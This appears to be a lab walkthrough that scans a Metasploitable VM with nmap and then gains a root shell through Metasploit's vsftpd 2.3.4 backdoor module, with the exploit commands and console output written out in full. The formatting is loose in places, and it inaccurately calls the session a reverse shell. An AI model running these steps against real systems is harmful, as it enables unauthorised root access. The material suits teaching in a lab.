
# FTP exploit (Kali Linux + Metasploitable)
In order to know, how a specific network is comprised of, `nmap <network>` can be run to discover all hosts in the given network. Ths allows us to target a chosen host.

How to scan a demo network (using a NAT network and two VM):
```
nmap 10.0.2.0/24
```
This command lists all hosts in a network. We select 10.0.2.4 as our target.

How to scan a host for specific applications running:
```
# the `sV` option adds the version of the service running.
# the `p` option contains a port range that is scanned.
nmap -sV -p 1-1000 10.0.2.4
```
This lists all tcp or udp applications running on the target. The data contains the port, if the the application is accessible, the name and version of the application.

Listed below is an example:
```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 1-1000 10.0.2.4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-14 09:31 EDT
Nmap scan report for 10.0.2.4
Host is up (0.00046s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp  open  telnet      Linux telnetd
25/tcp  open  smtp        Postfix smtpd
53/tcp  open  domain      ISC BIND 9.4.2
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp open  rpcbind     2 (RPC #100000)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp open  exec        netkit-rsh rexecd
513/tcp open  login       OpenBSD or Solaris rlogind
514/tcp open  tcpwrapped
Service Info: Host:  metasploitable.localdomain; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
There are several interesting (outdated) versions running of well known applications. The first application is already vulnerable. It is a ftp service version 2.3.4, which contains a known vulnerability. The metasploit framework offers an exploit useable the create a reverse shell on the host running this exploitable version of ftp.

This starts the metasploit framework:
```
msfconsole
```

To exploit a our specifc version of ftp (2.3.4), we first need to determine the existing exploits in the metasploit framework. To achieve this, we can use the `search <service> <version>` command.
```
search vsftpd 2.3.4

msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

```
As mentioned before, this version of ftp is exploitable, resulting in returning an useable exploit.

This is how we start using this exploit:
```
use exploit/unix/ftp/vsftpd_234_backdoor
```
However, before we can continue, we need to set the host that is targetted by the exploit.

To check if the host was not set, you can enter the command `show options`. This display several variables, where the `RHOSTS` variable contains the targets.
```
show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21               yes       The target port (TCP)

```

We need to specify the target host via RHOSTS!! (10.0.2.4)
The variable is set via the `set <variable> <value>` command.
```
set RHOSTS 10.0.2.4
```
To start exploiting, the command `exploit` is entered.
```
exploit
```

We successfully msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.0.2.4:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.2.4:21 - USER: 331 Please specify the password.
[+] 10.0.2.4:21 - Backdoor service has been spawned, handling...
[+] 10.0.2.4:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.0.2.15:34955 -> 10.0.2.4:6200) at 2023-09-14 09:42:08 -0400

```

After entering this command, a reverse shell is opened.
You can check whether this worked with the 
`whoami` command, which may output root (therefore, you have full access to the system)
